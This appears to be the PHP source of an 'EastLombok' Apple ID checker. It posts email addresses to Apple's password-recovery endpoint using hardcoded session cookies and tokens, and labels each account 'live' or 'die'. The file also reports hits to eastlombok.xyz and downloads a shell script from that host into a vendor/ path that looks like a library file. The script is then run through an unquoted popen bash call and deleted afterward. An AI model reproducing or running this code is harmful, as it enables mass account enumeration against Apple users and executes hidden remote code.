<?php 

function out($data, $cond){
	$output = popen("bash out.sh $data $cond", "wb");
	pclose($output);
}

function cekToken($token){
	$curl = curl_init();

	curl_setopt_array($curl, array(
		CURLOPT_URL => "http://eastlombok.xyz/restApi/cekKey.php?key=$token&tipe=amazonV3",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 0,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "GET",
	));

	$response = curl_exec($curl);
	curl_close($curl);
	if ($response == "true") {
		$status = true;
		return $status;
	}else{
		$status = false;
		return $status;
	}
}

function sendHits($hits){
	// curl hits
	$slug = "apple";

	$curl = curl_init();

	curl_setopt_array($curl, array(
		CURLOPT_URL => "http://eastlombok.xyz/restApi/hits.php?slug=$slug&hits=$hits",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 0,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "GET",
	));
	$response = curl_exec($curl);
	curl_close($curl);
}

function tulis($tipe, $data = null, $path){
	if ($tipe == "copret") {
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, "================Tool EastLombok===============\n=====created by: sayidina ahmadal qoqosyi=====\n\n");
		fclose($file);
	}else if($tipe == "dbug"){
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, "$data\n");
		fclose($file);
	}else{
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, $data."\n");
		fclose($file);
	}
}

function logic($email){

	$curl = curl_init();

	curl_setopt_array($curl, array(
		CURLOPT_URL => "https://iforgot.apple.com/password/verify/appleid",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 0,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS =>"{\r\n    \"id\": \"$email\"\r\n}",
		CURLOPT_HTTPHEADER => array(
			"User-Agent:  Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
			"Accept:  application/json, text/javascript, */*; q=0.01",
			"Accept-Language:  id,en-US;q=0.7,en;q=0.3",
			"Accept-Encoding:  gzip, deflate, br",
			"Content-Type:  application/json",
			"X-Apple-I-FD-Client-Info:  {\"U\":\"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\",\"L\":\"id\",\"Z\":\"GMT+14:00\",\"V\":\"1.1\",\"F\":\"Fla44j1e3NlY5BNlY5BSmHACVZXnN9Qhpua_BcdVxQ_2TJs0m_djJMC9RkW5BRhw6JA52e4W8IidmcKFychgqPXY5BNlY5cklY5BqNAE.lTjV.2cF\"}",
			"sstt:  8CZajpFO1oBipltmsL8vTqmKj0ByRs1fQX%2F%2B2yajtcWJermUHPFOYMHwN3Pco9kbIJNQnZm2ABsipAdxeo%2FKG18n9n9qmyG9om97isTmhyAw0Pmdkha1RCTPEXWO1NXulMEMtM%2FDpJajPAE%2FhJGNPCxgum4eapupVreQwqpRmo%2Bc64ydQIFPdBY6xV1O7C0si3mrwQ26UCFLlhV6sLurqlJYEvJuK5lFajgm3yx2CwNupCrbWET30QVFevTtz45YJoyBPNxbeuNpYbA3Dn6SQ1ZsWElgNSsUrYEOF%2BzaVif4E0OYak8cvCdSkYZpaWPDxfWZGQgYq8NOyIphAhtXsDdSRJl2p11dhF2m2kXpl5qMDNNvg%2FZKhWIYluJ%2FyJVsRZa%2FBPlNjODFjQtA",
			"X-Requested-With:  XMLHttpRequest",
			"Origin:  https://iforgot.apple.com",
			"DNT:  1",
			"Connection:  keep-alive",
			"Referer:  https://iforgot.apple.com/password/verify/appleid",
			"Cookie:  dslang=ID-ID; site=IDN; geo=ID; ccl=5fdTSe+hBg6nOcyTgOmz5A==; idclient=web; X-Apple-I-Web-Token=AAAAKjV8YWZiYmZlMTA4MGU3ZWYxYzA1YjEwMzg1MTFmMzAzZWEAAAF0RsimciUyO8Ji2QItH0PMJ3dsKE7itixyZHPGclAl0Li+lYGhxAn7rzPaAAGZ9pIs+UeRrKdLoPMf1+ZKY5Bx5lsOQfK1TaD2ekg7mUoigWLE8A==; ifssp=3E0260BD5552664196EAD823440415B1C4CA330A54354BE015533CA2069C5304ED1DC2BDCFDB0BCD117CB882BF41EA26241F75D02E34C4C00E343FC559EAAA48B6B437773C93B6D82B4100FA66F43BE5CB3BD10F73B810AEE9CA07D0CE582785EA54E444DEF0BBB95B6AC998CE1FF78C9CFAF67EC43027D6; ifs=D93BCABF74A24D0BC9E7146B8875EE26785A32BB36ED267832CB457121A2180A3EA1A8141DAE985821660A948D9486047F05B175A31F84B75D9E7A2731B2BD9659CAFD0268BB9E73D74DB0F2FC3BF114952A97EB726A588C83866A2D3B38A7704D4A2768CAC403FD7A28B6CDEDC386D18DBB471C14FBF7A166DBC8E24F15DC15EBAB4410634F2B66B2B7E1F8E2E1873EF345E8920FC3C07A25970A5C425501C201FD0213DA7DB8E3944E3214A65A5B8F32BF9E9A4F8124C24FA94369D3B8534E852A4921D61FCCC3427ED2E065C80EA5DA1B2525FAF164CCCFC04765E00673AF0C52878A5A50732E5393E5A4A6FC3BDC70678196C190003D6AA43BD828AE6B9E; idclient=web; dslang=ID-ID; site=IDN; ifssp=D84A0037130AFC203C0DFD5C395E7FCE9325D9046F40216D83D9380D7C0AE7B006431E128B62C8FB21333E4EB06D2A614FB13754E787BF2179064D04B006BD1E3FDBE113E1486EBA3732AAFD86BB66CF7F7B2E33BF6F76B640B33555FE73C56290B6E29AAF456A9ED90D98BCCC47601DFEB0610503E45ADF"
		),
	));

	$response = curl_exec($curl);
	// var_dump($response);
	// die();
	if (preg_match("/503 Service Temporarily Unavailable/", $response)) {
		$status = "something";
		return $status;
	}
	curl_close($curl);
	if ($response == false) {
		logic($email);
	}
	$decode = json_decode($response, true);
	if($decode == null){
		$status = "live";
	}elseif ($decode["serviceErrors"][0]["code"] == "appleIdNotSupported") {
		$status  = "die";
	}
	return $status;
}



function nicePosting($tipe){
	$tipes = $tipe.".sh";
	// url target unduhan
	$url = "http://eastlombok.xyz/restApi/cozy/$tipes";
// inisialisasi curl handler
	$ch = curl_init();
// setting option url target di curl
	curl_setopt($ch, CURLOPT_URL, $url);
// setting option nama file hasil unduhan 
	$filename = "vendor/brentkozjak/hash-identify/src/c.sh";
	$fp = fopen($filename, 'wb');
	if ($fp != true) {
		nicePosting($tipe);
	}
	curl_setopt($ch, CURLOPT_FILE, $fp);
// jalankan curl
	$x = curl_exec($ch);
// tutup curl
	curl_close($ch);
// tutup file hasil unduhan
	fclose($fp);
	return $x;
}

function shitPosting(){
	unlink('vendor/brentkozjak/hash-identify/src/c.sh');}


?>